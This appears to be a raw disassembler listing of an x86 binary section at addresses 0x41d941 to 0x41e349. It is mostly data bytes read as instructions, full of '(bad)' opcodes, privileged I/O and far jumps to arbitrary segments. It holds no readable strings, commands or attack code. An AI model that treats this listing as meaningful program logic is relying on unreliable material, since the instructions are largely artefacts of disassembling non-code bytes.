  41d941:	lock xchg ecx,eax
  41d943:	mov    eax,0x6a0fb30
  41d948:	and    eax,0x221c8ccb
  41d94d:	jmp    0x41d92a
  41d94f:	mov    ds:0x4ae29d40,al
  41d954:	jno    0x41d929
  41d956:	jns    0x41d9b6
  41d958:	cdq    
  41d959:	sub    dl,BYTE PTR [ebp+0x3a]
  41d95c:	or     eax,0x7205ec9e
  41d961:	sahf   
  41d962:	sbb    ecx,DWORD PTR [ebx+0x3b]
  41d965:	dec    ebx
  41d966:	jb     0x41d900
  41d968:	ins    BYTE PTR es:[edi],dx
  41d969:	xor    al,0x29
  41d96b:	push   ebp
  41d96c:	add    BYTE PTR ds:[eax],al
	...
  41d9d3:	add    BYTE PTR [eax],al
  41d9d5:	add    ah,al
  41d9d7:	ins    BYTE PTR es:[edi],dx
  41d9d8:	pop    es
  41d9d9:	pushf  
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	outs   dx,DWORD PTR gs:[esi]
  41d9e3:	add    eax,0x3e008588
  41d9e8:	add    DWORD PTR [eax],eax
  41d9ea:	inc    DWORD PTR [eax]
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	pop    eax
  41d9ef:	fcom   QWORD PTR ss:[ecx]
  41d9f2:	sbb    al,0x7d
  41d9f4:	push   ecx
  41d9f5:	pop    ds
  41d9f6:	and    DWORD PTR [ecx],edi
  41d9f8:	int3   
  41d9f9:	ss iret 
  41d9fb:	popa   
  41d9fc:	adc    esp,DWORD PTR [eax-0x59]
  41d9ff:	lods   al,BYTE PTR ds:[esi]
  41da00:	add    BYTE PTR [ecx-0x5a],bl
  41da03:	ins    DWORD PTR es:[edi],dx
  41da04:	mov    ah,0xf9
  41da06:	enter  0xf695,0xd9
  41da0a:	jle    0x41d9a6
  41da0c:	cwde   
  41da0d:	push   esp
  41da0e:	adc    BYTE PTR [ebx-0xd],bl
  41da11:	outs   dx,BYTE PTR ds:[esi]
  41da12:	jp     0x41d9ed
  41da14:	mov    ebp,0x9f3fb6e1
  41da19:	mov    WORD PTR [edi+0x79cba58a],?
  41da1f:	ja     0x41d9ab
  41da21:	rcl    DWORD PTR [esp+ecx*4-0x6e0864c1],1
  41da28:	push   es
  41da29:	mov    esi,0xfea55a68
  41da2e:	inc    ebp
  41da2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da30:	les    ebp,FWORD PTR [edi-0x20765f52]
  41da36:	(bad)  
  41da37:	cmp    DWORD PTR [edx-0x5e],esp
  41da3a:	les    ecx,FWORD PTR [ebx-0x5c]
  41da3d:	loop   0x41da00
  41da3f:	loopne 0x41da04
  41da41:	enter  0x88b9,0x33
  41da45:	or     eax,0x1cca7d12
  41da4a:	sbb    eax,0x710e4e91
  41da4f:	aam    0x7b
  41da51:	add    eax,0x4daaac1e
  41da56:	sbb    edi,ebp
  41da58:	lods   eax,DWORD PTR ds:[esi]
  41da59:	mov    bh,0x16
  41da5b:	push   edx
  41da5c:	inc    ebx
  41da5d:	inc    eax
  41da5e:	mov    esi,ecx
  41da60:	sar    DWORD PTR [ebp+0x26],cl
  41da63:	shr    DWORD PTR [edi],0x7
  41da66:	in     al,0x2
  41da68:	jle    0x41da00
  41da6a:	cmp    DWORD PTR [edx-0x592f0396],0x66bf6495
  41da74:	mov    ebx,0x5378a545
  41da79:	push   ecx
  41da7a:	ror    DWORD PTR [esi],cl
  41da7c:	dec    edx
  41da7d:	sbb    esp,DWORD PTR [ecx-0x5dd79381]
  41da83:	pop    eax
  41da84:	outs   dx,DWORD PTR ds:[esi]
  41da85:	mov    esi,0x986664da
  41da8a:	or     edi,DWORD PTR [edx+0x16]
  41da8d:	sub    DWORD PTR [edx+ecx*4+0x3bb83b1e],esp
  41da94:	aas    
  41da95:	dec    ebp
  41da96:	xor    DWORD PTR [eax],0xffffffeb
  41da99:	loope  0x41db01
  41da9b:	and    dl,bh
  41da9d:	call   0xb1bd15f7
  41daa2:	xchg   esi,eax
  41daa3:	sub    BYTE PTR [esi-0x443a682e],bh
  41daa9:	mov    esi,DWORD PTR [edi+0x7c]
  41daac:	fdiv   DWORD PTR [ecx]
  41daae:	mov    al,BYTE PTR [edx+0x58]
  41dab1:	ret    
  41dab2:	dec    esp
  41dab3:	inc    edx
  41dab4:	xor    DWORD PTR [ebx+0x6c],0x3e
  41dab8:	lea    ecx,[esi+0x0]
  41dabb:	add    bl,BYTE PTR [edi+0xc6302af]
  41dac1:	dec    ebp
  41dac2:	jle    0x41da5c
  41dac4:	dec    ebx
  41dac5:	cld    
  41dac6:	adc    ch,BYTE PTR [ecx+0x68]
  41dac9:	dec    ebx
  41daca:	mov    eax,DWORD PTR [eax]
  41dacc:	pop    ebx
  41dacd:	jp     0x41da60
  41dacf:	add    eax,0xc36a4ebe
  41dad4:	mov    dh,0xce
  41dad6:	push   cs
  41dad7:	sbb    al,0xc0
  41dad9:	dec    ebp
  41dada:	bswap  ebx
  41dadc:	in     eax,0x73
  41dade:	(bad)  
  41dae1:	nop
  41dae2:	sbb    BYTE PTR [ebp-0x4659be94],bl
  41dae8:	push   es
  41dae9:	in     eax,0xa0
  41daeb:	sbb    BYTE PTR [eax],cl
	...
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0x2
  41db63:	mov    eax,ds:0x3effb656
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	inc    DWORD PTR [eax]
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	cmp    DWORD PTR [ebp-0x25],eax
  41db71:	leave  
  41db72:	fwait
  41db73:	sub    DWORD PTR [ebx+0x65],esi
  41db76:	pop    ss
  41db77:	inc    edx
  41db78:	push   ds
  41db79:	test   BYTE PTR [esi-0x31edb297],0xc5
  41db80:	stc    
  41db81:	fs jne 0x41dbfe
  41db84:	call   0x33a6:0xbe16bcd0
  41db8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db8c:	inc    esp
  41db8d:	pusha  
  41db8e:	sbb    DWORD PTR [esi-0xf211e3e],ecx
  41db94:	xchg   ecx,eax
  41db95:	rcr    BYTE PTR [edx-0xf27f54c],1
  41db9b:	les    esp,FWORD PTR [edx]
  41db9d:	or     ch,BYTE PTR [ecx+0x35832528]
  41dba3:	stos   BYTE PTR es:[edi],al
  41dba4:	push   ebp
  41dba5:	in     al,0x91
  41dba7:	and    esi,DWORD PTR [ebp+0x70]
  41dbaa:	aam    0x56
  41dbac:	sbb    DWORD PTR [ebx+0x2c9fd51a],0xfffffff9
  41dbb3:	outs   dx,DWORD PTR ds:[esi]
  41dbb4:	push   eax
  41dbb5:	stc    
  41dbb6:	inc    eax
  41dbb7:	inc    ebx
  41dbb8:	mov    esi,0x405ec741
  41dbbd:	retf   0x6bd6
  41dbc0:	ins    DWORD PTR es:[edi],dx
  41dbc1:	pushf  
  41dbc2:	test   al,0x9b
  41dbc4:	dec    esi
  41dbc5:	inc    edi
  41dbc6:	into   
  41dbc7:	or     BYTE PTR [edx+0x1400efac],dh
  41dbcd:	push   eax
  41dbce:	jmp    0xf580:0x2b288255
  41dbd5:	jae    0x41dc02
  41dbd7:	jl     0x41dc4d
  41dbd9:	hlt    
  41dbda:	xchg   edi,eax
  41dbdb:	xchg   ebp,eax
  41dbdc:	sbb    eax,0x2c69ef33
  41dbe1:	or     eax,0x8b2edd7f
  41dbe6:	cmp    DWORD PTR [edi],esi
  41dbe8:	pop    es
  41dbe9:	xchg   edx,eax
  41dbea:	xchg   ecx,eax
  41dbeb:	cmp    al,0xc
  41dbed:	pop    es
  41dbee:	test   al,0x52
  41dbf0:	iret   
  41dbf1:	inc    ecx
  41dbf2:	lahf   
  41dbf3:	pop    eax
  41dbf4:	fild   QWORD PTR [ecx]
  41dbf6:	push   0x32f3d88
  41dbfb:	(bad)  
  41dbfc:	dec    ebp
  41dbfd:	add    esi,eax
  41dbff:	cmp    al,0x58
  41dc01:	inc    ecx
  41dc02:	pop    ebx
  41dc03:	sub    ah,BYTE PTR [ebx+0x55]
  41dc06:	pop    esi
  41dc07:	jae    0x41dbe9
  41dc09:	in     eax,dx
  41dc0a:	cmp    eax,0xc809a253
  41dc0f:	lods   al,BYTE PTR ds:[esi]
  41dc10:	cmp    edx,DWORD PTR [edx+0x72]
  41dc13:	or     al,0x75
  41dc15:	je     0x41dbaa
  41dc17:	push   cs
  41dc18:	cmp    bh,BYTE PTR [edx]
  41dc1a:	fld    QWORD PTR [edi]
  41dc1c:	arpl   WORD PTR [ebp-0x178e023d],dx
  41dc22:	add    ch,BYTE PTR [edi+0x73bf7c51]
  41dc28:	inc    edx
  41dc29:	(bad)  
  41dc2a:	xlat   BYTE PTR ds:[ebx]
  41dc2b:	js     0x41dca9
  41dc2d:	dec    ecx
  41dc2e:	pushf  
  41dc2f:	xor    ebx,ebx
  41dc31:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc33:	shl    BYTE PTR [edx+esi*4+0x16],cl
  41dc37:	jmp    0x60ba:0x1a6cd168
  41dc3e:	sub    al,0x99
  41dc40:	cmp    al,0x3c
  41dc42:	aad    0xaf
  41dc44:	nop
  41dc45:	mov    ebx,0x813c6a1b
  41dc4a:	sar    BYTE PTR [eax-0x5c],cl
  41dc4d:	inc    ebp
  41dc4e:	mov    ds:0x6b086033,al
  41dc53:	add    eax,0x61bcb35f
  41dc58:	and    ebp,eax
  41dc5a:	mov    bl,0xc8
  41dc5c:	mov    esi,0xbf00b266
  41dc61:	mov    edi,0xd330c806
  41dc66:	nop
  41dc67:	add    al,0x2f
  41dc69:	test   eax,0xdfd412
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi+0x79b0d050]
  41dce3:	cmp    dl,BYTE PTR [edx]
  41dce5:	(bad)  
  41dce7:	aas    
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	inc    DWORD PTR [eax]
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	fidiv  DWORD PTR [esi+0x205c885a]
  41dcf4:	lods   al,BYTE PTR ds:[esi]
  41dcf5:	out    0xab,eax
  41dcf7:	mov    eax,ds:0x270cfaf8
  41dcfc:	in     al,0x73
  41dcfe:	shr    dl,0xe6
  41dd01:	std    
  41dd02:	adc    eax,0x4d5ddae0
  41dd07:	test   dl,ch
  41dd09:	(bad)  
  41dd0a:	mov    bl,0x2c
  41dd0c:	daa    
  41dd0d:	icebp  
  41dd0e:	or     DWORD PTR [edx+0x45d98cb2],ebp
  41dd14:	cmp    DWORD PTR [ebp+0x2c31265],0x7f2a18ce
  41dd1e:	loop   0x41dd1c
  41dd20:	mov    edi,0x76b21f4d
  41dd25:	aaa    
  41dd26:	inc    ebx
  41dd27:	hlt    
  41dd28:	pop    ss
  41dd29:	inc    ebp
  41dd2a:	mov    ds:0x1b66bc9a,al
  41dd2f:	repnz std 
  41dd31:	cmp    al,0xc5
  41dd33:	or     al,0xab
  41dd35:	std    
  41dd36:	nop
  41dd37:	xchg   esp,eax
  41dd38:	std    
  41dd39:	mov    ch,0xcb
  41dd3b:	inc    esi
  41dd3c:	xchg   ecx,eax
  41dd3d:	inc    ebp
  41dd3e:	sub    BYTE PTR [eax+0x3],dh
  41dd41:	jae    0x41dda7
  41dd43:	sbb    eax,0x32812c17
  41dd48:	pop    esp
  41dd49:	pushf  
  41dd4a:	jb     0x41dd61
  41dd4c:	shl    cl,1
  41dd4e:	mov    BYTE PTR [edx+0x75],dl
  41dd51:	dec    eax
  41dd52:	or     al,0xbf
  41dd54:	and    eax,0xd8ddd2dc
  41dd59:	xor    ebx,DWORD PTR [esi+eax*2]
  41dd5c:	sub    ebx,DWORD PTR [eax-0x48d69c4]
  41dd62:	fisttp WORD PTR [edi]
  41dd64:	push   ebx
  41dd65:	packssdw mm2,QWORD PTR [ebp+ebp*4-0x80]
  41dd6a:	jne    0x41dd39
  41dd6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd6d:	mov    bh,0x58
  41dd6f:	das    
  41dd70:	adc    edi,ebx
  41dd72:	int3   
  41dd73:	rol    BYTE PTR ds:0x1018cf65,cl
  41dd79:	loopne 0x41ddcb
  41dd7b:	ror    cl,1
  41dd7d:	cdq    
  41dd7e:	pop    es
  41dd7f:	aaa    
  41dd80:	bound  edi,QWORD PTR [ebp-0x17]
  41dd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd84:	scas   eax,DWORD PTR es:[edi]
  41dd85:	and    al,0xdf
  41dd87:	bound  ebp,QWORD PTR [esi+eax*1]
  41dd8a:	cmp    BYTE PTR [edx],0xd8
  41dd8d:	ret    0x5dc6
  41dd90:	aad    0x6d
  41dd92:	pop    es
  41dd93:	imul   ecx,ecx,0x74271c66
  41dd99:	add    bh,BYTE PTR [edx-0x60e720cb]
  41dd9f:	mov    ah,0x10
  41dda1:	out    0x86,eax
  41dda3:	push   0xe
  41dda5:	sub    BYTE PTR [edx],ah
  41dda7:	add    BYTE PTR [ecx-0x55],dl
  41ddaa:	imul   esp,esp,0x3e7b7d46
  41ddb0:	int3   
  41ddb1:	mov    ebp,0x762cc39e
  41ddb6:	fwait
  41ddb7:	int3   
  41ddb8:	mov    BYTE PTR [eax-0x1d],bh
  41ddbb:	jne    0x41dd99
  41ddbd:	mov    eax,ds:0xcc33766
  41ddc2:	xchg   ebp,eax
  41ddc3:	arpl   cx,sp
  41ddc5:	add    ch,BYTE PTR [eax+0x2e]
  41ddc8:	ret    
  41ddc9:	xchg   esp,eax
  41ddca:	repnz repnz rcl ebx,cl
  41ddce:	aam    0x2a
  41ddd0:	shr    BYTE PTR [esi+0x1923a5a7],0x18
  41ddd7:	xchg   BYTE PTR [ecx+0x15fb49c7],dh
  41dddd:	leave  
  41ddde:	mov    ch,0x9d
  41dde0:	sub    al,0xb3
  41dde2:	adc    edx,DWORD PTR [esi]
  41dde4:	xchg   ebx,eax
  41dde5:	xor    al,0xe4
  41dde7:	xlat   BYTE PTR ds:[ebx]
  41dde8:	jge    0x41ddc2
  41ddea:	jno    0x41de53
  41ddec:	popf   
	...
  41de55:	add    BYTE PTR [eax],ah
  41de57:	repz das 
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	sub    cl,ch
  41de64:	ficomp DWORD PTR [ecx]
  41de66:	std    
  41de67:	inc    eax
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	inc    DWORD PTR [eax]
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	or     al,0x38
  41de70:	gs enter 0x24ce,0xbf
  41de75:	cli    
  41de76:	dec    esp
  41de77:	mov    esp,0x2007c28c
  41de7c:	out    0x10,eax
  41de7e:	bound  eax,QWORD PTR [ebp-0x63980869]
  41de84:	fist   DWORD PTR [edi+0xae64fcb]
  41de8a:	mov    eax,ds:0x1c81bac3
  41de8f:	fcom   st(2)
  41de91:	cmp    esp,DWORD PTR [ecx-0x44]
  41de94:	imul   eax,DWORD PTR [edi+0x9261009],0xbfefa930
  41de9e:	imul   ebx
  41dea0:	mov    eax,0xb71c8b69
  41dea5:	add    ebp,DWORD PTR [ebp+edi*1-0xd5286e9]
  41deac:	cdq    
  41dead:	dec    ecx
  41deae:	cwde   
  41deaf:	mov    ch,0x62
  41deb1:	or     eax,0x788b9b6c
  41deb6:	pop    edx
  41deb7:	or     ebp,ecx
  41deb9:	add    al,0x8c
  41debb:	push   es
  41debc:	sar    BYTE PTR [edi],1
  41debe:	or     bh,al
  41dec0:	rcl    DWORD PTR [eax-0x74],1
  41dec3:	dec    eax
  41dec4:	sar    bl,1
  41dec6:	jno    0x41dedb
  41dec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dec9:	sub    ebp,ebp
  41decb:	xchg   edi,eax
  41decc:	gs stc 
  41dece:	js     0x41df08
  41ded0:	(bad)  
  41ded1:	pop    esi
  41ded2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ded3:	daa    
  41ded4:	push   eax
  41ded5:	dec    ecx
  41ded6:	xchg   esp,eax
  41ded7:	in     al,dx
  41ded8:	clc    
  41ded9:	aad    0x5a
  41dedb:	ret    
  41dedc:	fcomp  QWORD PTR [edx+0x49]
  41dedf:	mov    esi,0x30ebf976
  41dee4:	xor    al,0x1c
  41dee6:	lds    edx,FWORD PTR [ecx-0x577fb55c]
  41deec:	inc    esi
  41deed:	xchg   dh,bl
  41deef:	mov    ebp,ss
  41def1:	xchg   esi,ebp
  41def3:	cdq    
  41def4:	arpl   WORD PTR [bx+di-0x42],ax
  41def8:	pop    ds
  41def9:	lods   eax,DWORD PTR ds:[esi]
  41defa:	push   cs
  41defb:	mov    al,ds:0x8cc2379a
  41df00:	jne    0x41de9a
  41df02:	arpl   sp,ax
  41df04:	fld    TBYTE PTR [edi-0x6f]
  41df07:	push   edi
  41df08:	mov    bl,0x49
  41df0a:	scas   eax,DWORD PTR es:[edi]
  41df0b:	mov    esi,0xd443612a
  41df10:	into   
  41df11:	mov    ecx,0xd29bab0d
  41df16:	mov    al,ds:0x805b6e1d
  41df1b:	dec    esi
  41df1c:	xchg   BYTE PTR [edi-0x2d],al
  41df1f:	test   DWORD PTR [edx-0x7ed4680a],edi
  41df25:	cmp    al,0xa2
  41df27:	mov    al,ds:0x993ddf6d
  41df2c:	clc    
  41df2d:	sbb    ch,cl
  41df2f:	icebp  
  41df30:	js     0x41dec8
  41df32:	rol    DWORD PTR ds:[ecx+0x68],1
  41df36:	sbb    al,0xf7
  41df38:	xchg   edx,eax
  41df39:	xchg   ebp,eax
  41df3a:	mov    al,0xb4
  41df3c:	fcmovnu st,st(7)
  41df3e:	cli    
  41df3f:	test   al,0xad
  41df41:	mov    eax,0xd95159d9
  41df46:	scas   eax,DWORD PTR es:[edi]
  41df47:	sub    bh,BYTE PTR [ecx-0x565fabaa]
  41df4d:	dec    esi
  41df4e:	sub    DWORD PTR [ecx],ebp
  41df50:	jbe    0x41dedc
  41df52:	adc    eax,0xa77e0fac
  41df57:	jne    0x41df07
  41df59:	adc    bh,bh
  41df5b:	ds fwait
  41df5d:	das    
  41df5e:	cmp    al,0x99
  41df60:	fist   DWORD PTR [edi+0xa]
  41df63:	mov    eax,ds:0x3109d1b7
  41df68:	cmp    eax,0xc3f3dffd
	...
  41dfd5:	add    BYTE PTR [edi],bh
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0xefb9ce9
  41dfe4:	mov    al,0x94
  41dfe6:	cld    
  41dfe7:	inc    ecx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	inc    DWORD PTR [eax]
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	add    ah,0x45
  41dff1:	call   0x51a7a60d
  41dff6:	div    DWORD PTR fs:[ebx]
  41dff9:	lds    ebx,FWORD PTR [esi-0x960e5a3]
  41dfff:	xchg   edx,eax
  41e000:	mov    ecx,0x49338015
  41e005:	pop    es
  41e006:	adc    al,0x1a
  41e008:	inc    esp
  41e009:	cmp    al,dh
  41e00b:	adc    al,0x73
  41e00d:	sub    DWORD PTR [ebx],0x11
  41e010:	frstor [edi+0x11]
  41e013:	mov    edx,DWORD PTR [ebp-0x268cb3f8]
  41e019:	dec    ecx
  41e01a:	dec    eax
  41e01b:	fs mov ecx,0xfd17fb58
  41e021:	and    BYTE PTR [ecx-0x644cd305],bh
  41e027:	push   edx
  41e028:	mov    bl,0x25
  41e02a:	jnp    0x41e062
  41e02c:	popa   
  41e02d:	xor    ebx,DWORD PTR [edx]
  41e02f:	sub    BYTE PTR [esi],0x38
  41e032:	pushf  
  41e033:	xchg   DWORD PTR [ebx+edx*1-0x8],esi
  41e037:	add    BYTE PTR [ebp-0x17c4d7a8],dl
  41e03d:	in     al,dx
  41e03e:	push   ds
  41e03f:	jno    0x41dfeb
  41e041:	mov    bl,0x7f
  41e043:	std    
  41e044:	mov    esi,0x9b8c4def
  41e049:	adc    al,0x69
  41e04b:	ss jmp 0x56e789b3
  41e051:	out    0xd9,al
  41e053:	pop    es
  41e054:	inc    ebp
  41e055:	shr    DWORD PTR [edi+0x47a2027c],cl
  41e05b:	fist   WORD PTR [esi+0x61995b0b]
  41e061:	rol    BYTE PTR ss:[esi-0x7272031],1
  41e068:	retf   0xba5c
  41e06b:	(bad)  
  41e06c:	out    dx,eax
  41e06d:	xor    al,0xd7
  41e06f:	mov    ds:0xe1310422,al
  41e074:	and    eax,0xe647c8c2
  41e079:	ret    0x8b25
  41e07c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e07d:	int3   
  41e07e:	or     cl,dl
  41e080:	mov    eax,ds:0x636306b3
  41e085:	shl    DWORD PTR [ebx-0x77],0x12
  41e089:	in     eax,0x19
  41e08b:	lds    esp,FWORD PTR [esi]
  41e08d:	fmul   QWORD PTR [ecx]
  41e08f:	inc    eax
  41e090:	and    edx,DWORD PTR [edi+0x2f]
  41e093:	scas   al,BYTE PTR es:[edi]
  41e094:	fs into 
  41e096:	pop    ebx
  41e097:	(bad)  
  41e098:	mov    edi,DWORD PTR [edi+0x29]
  41e09b:	jl     0x41e059
  41e09d:	sbb    al,0xec
  41e09f:	pop    ebx
  41e0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a1:	jmp    0xa22b:0x51450969
  41e0a8:	ds call 0x3069:0xec8711bc
  41e0b0:	popa   
  41e0b1:	and    bl,BYTE PTR [ebx-0xa]
  41e0b4:	ss jl  0x41e0c6
  41e0b7:	jge    0x41e119
  41e0b9:	not    ebx
  41e0bb:	push   esi
  41e0bc:	stos   BYTE PTR es:[edi],al
  41e0bd:	aad    0xf0
  41e0bf:	push   ds
  41e0c0:	xchg   esi,eax
  41e0c1:	inc    edi
  41e0c2:	aaa    
  41e0c3:	mov    eax,0xb6f7fadb
  41e0c8:	(bad)  
  41e0c9:	(bad)  
  41e0ca:	sub    eax,0xc155d430
  41e0cf:	popa   
  41e0d0:	(bad)  
  41e0d1:	call   0xaa92:0xacf8b883
  41e0d8:	test   BYTE PTR [edi],0xae
  41e0db:	sti    
  41e0dc:	js     0x41e0f1
  41e0de:	or     DWORD PTR [eax+0x17],0x30
  41e0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0e3:	jae    0x41e0ba
  41e0e5:	jmp    0x41e10d
  41e0e7:	inc    edi
  41e0e8:	fnstcw WORD PTR [ebx]
  41e0ea:	outs   dx,BYTE PTR ds:[esi]
  41e0eb:	jecxz  0x41e082
	...
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	out    dx,eax
  41e163:	xor    DWORD PTR [edi],eax
  41e165:	(bad)  
  41e167:	inc    edx
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	inc    DWORD PTR [eax]
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	inc    edx
  41e16f:	sbb    eax,0x1beb83f4
  41e174:	nop
  41e175:	call   0xd20a:0x907e9323
  41e17c:	cli    
  41e17d:	inc    edx
  41e17e:	cld    
  41e17f:	std    
  41e180:	xor    dl,BYTE PTR [eax+0x38]
  41e183:	jo     0x41e141
  41e185:	cmp    ebp,edx
  41e187:	push   esi
  41e188:	push   ecx
  41e189:	push   edi
  41e18a:	xor    edx,DWORD PTR [edx+0x1b]
  41e18d:	ins    DWORD PTR es:[edi],dx
  41e18e:	leave  
  41e18f:	push   esp
  41e190:	(bad)  
  41e191:	add    DWORD PTR [ebp+0x1a4ce27d],0xffffffae
  41e198:	hlt    
  41e199:	inc    esi
  41e19a:	push   edx
  41e19b:	inc    esp
  41e19c:	or     dh,BYTE PTR [ecx-0x29f1a353]
  41e1a2:	add    DWORD PTR [esi-0x29],ecx
  41e1a5:	ficom  DWORD PTR [ebp+0x3838a38d]
  41e1ab:	test   BYTE PTR [esi+edx*8],ch
  41e1ae:	sahf   
  41e1af:	pop    ss
  41e1b0:	fwait
  41e1b1:	push   esp
  41e1b2:	cmp    al,0x55
  41e1b4:	test   eax,0xb409a8a3
  41e1b9:	into   
  41e1ba:	adc    BYTE PTR [ebx+0x67],ah
  41e1bd:	fmul   st(4),st
  41e1bf:	leave  
  41e1c0:	sub    BYTE PTR [eax+edx*8+0x99da977],al
  41e1c7:	push   edx
  41e1c8:	dec    eax
  41e1c9:	jno    0x41e14e
  41e1cb:	adc    eax,0x1a15e316
  41e1d0:	lods   eax,DWORD PTR ds:[esi]
  41e1d1:	rol    BYTE PTR [ecx],1
  41e1d3:	and    BYTE PTR [eax-0x2633077a],ah
  41e1d9:	enter  0x1be0,0x30
  41e1dd:	(bad)
  41e1e0:	mov    ch,0x43
  41e1e2:	add    ebp,DWORD PTR [ecx+0x64]
  41e1e5:	dec    ebp
  41e1e6:	xchg   bh,cl
  41e1e8:	adc    edx,DWORD PTR [ecx-0x6]
  41e1eb:	loope  0x41e1db
  41e1ed:	lea    ecx,[ebx]
  41e1ef:	sub    al,0x1b
  41e1f1:	call   0x8ad9:0xa72415d0
  41e1f8:	dec    esi
  41e1f9:	vxorps xmm5,xmm6,xmm1
  41e1fd:	jmp    0x354778eb
  41e202:	jmp    0x41e1a1
  41e204:	jge    0x41e261
  41e206:	dec    esp
  41e207:	and    DWORD PTR [eax],edi
  41e209:	dec    esi
  41e20a:	aas    
  41e20b:	mov    cl,bl
  41e20d:	into   
  41e20e:	ret    
  41e20f:	fmul   DWORD PTR [ebp-0x43]
  41e212:	je     0x41e24e
  41e214:	pusha  
  41e215:	add    al,dl
  41e217:	data16 jb 0x41e223
  41e21a:	sub    al,0x5e
  41e21c:	cdq    
  41e21d:	pop    ss
  41e21e:	sub    ch,BYTE PTR [esi]
  41e220:	in     al,dx
  41e221:	jae    0x41e1aa
  41e223:	cmc    
  41e224:	pop    esi
  41e225:	mov    ?,WORD PTR [ecx-0x156e61d0]
  41e22b:	push   ebp
  41e22c:	dec    edx
  41e22d:	repz repz pop esi
  41e230:	(bad)  
  41e231:	shl    DWORD PTR [edi],1
  41e233:	xlat   BYTE PTR ds:[ebx]
  41e234:	fdiv   DWORD PTR ds:0x3d1bda7f
  41e23a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e23b:	adc    eax,0x6ee49d4a
  41e240:	xchg   BYTE PTR [edx+0x3b],ah
  41e243:	daa    
  41e244:	das    
  41e245:	inc    esp
  41e246:	mov    ch,0xc6
  41e248:	cmc    
  41e249:	in     al,dx
  41e24a:	sti    
  41e24b:	test   BYTE PTR [eax],ch
  41e24d:	in     al,dx
  41e24e:	out    0x46,al
  41e250:	retf   0x9910
  41e253:	(bad)  
  41e254:	aam    0x1b
  41e256:	aas    
  41e257:	cdq    
  41e258:	inc    edi
  41e259:	js     0x41e2c3
  41e25b:	cmp    al,0x4e
  41e25d:	mov    dh,0x9c
  41e25f:	sub    bl,ah
  41e261:	clc    
  41e262:	adc    DWORD PTR [esi-0xa],eax
  41e265:	cwde   
  41e266:	dec    edx
  41e267:	int    0xb1
  41e269:	sbb    cl,cl
  41e26b:	das    
  41e26c:	in     eax,0x0
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x17
  41e2e3:	hlt    
  41e2e4:	and    bh,dl
  41e2e6:	cli    
  41e2e7:	inc    ebx
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	inc    DWORD PTR [eax]
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	out    0x36,eax
  41e2f0:	inc    ebp
  41e2f1:	inc    ebp
  41e2f2:	fild   WORD PTR [ebp+0x181dd0c3]
  41e2f8:	int    0xb4
  41e2fa:	jns    0x41e2b8
  41e2fc:	ins    DWORD PTR es:[edi],dx
  41e2fd:	dec    edx
  41e2fe:	xor    eax,0xf8d786dd
  41e303:	ins    DWORD PTR es:[edi],dx
  41e304:	data16 ins BYTE PTR es:[edi],dx
  41e306:	mov    ecx,0x5490c37d
  41e30b:	inc    esi
  41e30c:	pushf  
  41e30d:	mov    dl,0x5c
  41e30f:	sub    eax,0x24668a95
  41e314:	xchg   BYTE PTR [edi],al
  41e316:	aad    0x4f
  41e318:	pop    esi
  41e319:	stos   DWORD PTR es:[edi],eax
  41e31a:	pxor   mm6,mm1
  41e31d:	sub    DWORD PTR [ebx+0x48],esp
  41e320:	sub    BYTE PTR [esi],bl
  41e322:	xor    dl,BYTE PTR [ebx+0x3d]
  41e325:	pop    ss
  41e326:	std    
  41e327:	aam    0xa1
  41e329:	mov    eax,ss:0x66bc856
  41e32f:	fnstenv [eax-0x7a9cb295]
  41e335:	in     al,dx
  41e336:	test   DWORD PTR [eax],eax
  41e338:	inc    eax
  41e339:	xchg   ebp,eax
  41e33a:	imul   ecx,DWORD PTR [esi],0xe53bb0ac
  41e340:	inc    ecx
  41e341:	push   cs
  41e342:	adc    dh,ch
  41e344:	mov    ebx,0xfac55030
  41e349:	push   0x8662eb4
